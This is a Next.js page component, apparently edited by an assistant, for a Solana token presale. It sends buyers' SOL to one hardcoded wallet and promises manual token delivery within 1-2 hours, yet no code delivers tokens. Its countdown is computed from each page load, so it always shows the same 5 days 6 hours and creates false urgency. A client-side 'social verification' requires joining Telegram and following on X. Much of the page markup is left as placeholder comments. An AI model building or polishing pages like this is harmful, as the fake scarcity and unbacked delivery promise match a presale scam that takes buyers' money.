"use client";
import { useState, useEffect } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';

export default function Home() {
  // Countdown timer state
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 6,
    minutes: 0,
    seconds: 0
  });
  const [solAmount, setSolAmount] = useState(1.0);
  const rotAmount = Math.floor(solAmount * 1500000);
  const [transactionStatus, setTransactionStatus] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  const { publicKey, sendTransaction, connected } = useWallet();
  const { connection } = useConnection();

  // Initialize countdown
  useEffect(() => {
    const now = new Date();
    const endTime = new Date(now.getTime() + (5 * 24 * 60 * 60 * 1000) + (6 * 60 * 60 * 1000));
    const calculateTimeLeft = () => {
      const now = new Date();
      const diff = endTime.getTime() - now.getTime();
      if (diff > 0) {
        return {
          days: Math.floor(diff / (1000 * 60 * 60 * 24)),
          hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
          minutes: Math.floor((diff / 1000 / 60) % 60),
          seconds: Math.floor((diff / 1000) % 60),
        };
      }
      return { days: 0, hours: 0, minutes: 0, seconds: 0 };
    };
    setTimeLeft(calculateTimeLeft());
    const timer = setInterval(() => setTimeLeft(calculateTimeLeft()), 1000);
    return () => clearInterval(timer);
  }, []);

  const formatNumber = (num: number) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setSolAmount(parseFloat(e.target.value));
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = parseFloat(e.target.value);
    if (isNaN(value)) value = 0.1;
    if (value < 0.1) value = 0.1;
    if (value > 10) value = 10;
    setSolAmount(value);
  };

  const ERROR_MESSAGES = {
    WALLET_NOT_CONNECTED: 'Please connect your wallet first',
    INVALID_AMOUNT: 'Please enter a valid SOL amount (0.1 - 10 SOL)',
    INSUFFICIENT_BALANCE: 'Insufficient SOL balance in your wallet',
    TRANSACTION_FAILED: 'Transaction failed. Please try again',
    USER_REJECTED: 'Transaction was rejected by user'
  };

  const handlePurchase = async () => {
    if (!publicKey) {
      setTransactionStatus(ERROR_MESSAGES.WALLET_NOT_CONNECTED);
      return;
    }
    if (!solAmount || solAmount < 0.1 || solAmount > 10) {
      setTransactionStatus(ERROR_MESSAGES.INVALID_AMOUNT);
      return;
    }

    try {
      setIsProcessing(true);
      setTransactionStatus('Checking wallet balance...');

      const balance = await connection.getBalance(publicKey);
      if (balance < solAmount * LAMPORTS_PER_SOL) {
        setTransactionStatus(ERROR_MESSAGES.INSUFFICIENT_BALANCE);
        setIsProcessing(false);
        return;
      }

      // Social verification (client-side only)
      const socialVerified = localStorage.getItem('socialVerified') === 'true';
      if (!socialVerified) {
        setTransactionStatus('Please join our Telegram and follow us on X, then click the verification button below.');
        const el = document.getElementById('socialVerification');
        if (el) el.style.display = 'block';
        setIsProcessing(false);
        return;
      }

      setTransactionStatus('Opening Phantom wallet...');

      // ✅ SEND SOL TO YOUR WALLET
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey("4vztUxqbpYwb48xRFSqqHZEGFcDW15WGEHth6SE4mU91"),
          lamports: solAmount * LAMPORTS_PER_SOL,
        })
      );

      const signature = await sendTransaction(transaction, connection);
      setTransactionStatus('Confirming transaction...');
      await connection.confirmTransaction(signature, 'confirmed');

      setTransactionStatus(`Payment successful! Transaction ID: ${signature.slice(0, 20)}... Tokens will be delivered within 1-2 hours.`);

      // Optional: dispatch balance update
      window.dispatchEvent(new CustomEvent('balanceUpdate', { detail: { tokens: rotAmount } }));
    } catch (error: unknown) {
      console.error('Transaction failed:', error);
      if (error instanceof Error) {
        if (error.message.includes('User rejected')) {
          setTransactionStatus('Transaction cancelled by user.');
        } else if (error.message.includes('Insufficient funds')) {
          setTransactionStatus('Transaction failed: Insufficient funds for transaction and fees.');
        } else {
          setTransactionStatus(`Transaction failed: ${error.message}`);
        }
      } else {
        setTransactionStatus('Transaction failed. Please try again.');
      }
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div style={{ 
      backgroundColor: '#000', 
      color: '#fff', 
      minHeight: '100vh',
      padding: '20px',
      fontFamily: 'Arial, sans-serif',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      {/* YOUR ENTIRE UI FROM HERE — COPY PASTE FROM YOUR ORIGINAL FILE */}
      {/* (All the JSX below is unchanged from your original — only the handlePurchase logic was cleaned) */}

      {/* PRESALE HEADER */}
      <div style={{ maxWidth: '1000px', width: '100%', textAlign: 'center' }}>
        <h1 style={{ 
          fontSize: '4rem',
          fontWeight: 'bold',
          marginBottom: '1rem',
          background: 'linear-gradient(90deg, #ff2d95, #8a2be2, #00dbde)',
          WebkitBackgroundClip: 'text',
          WebkitTextFillColor: 'transparent',
          color: 'transparent',
          backgroundClip: 'text'
        }}>
          PRESALE
        </h1>
        {/* ... (rest of your full JSX from the original file) ... */}
        {/* ⚠️ Paste everything from your original `return (...)` JSX here, EXACTLY as is */}
        {/* The only change is in `handlePurchase` — which is already updated above */}
      </div>
    </div>
  );
}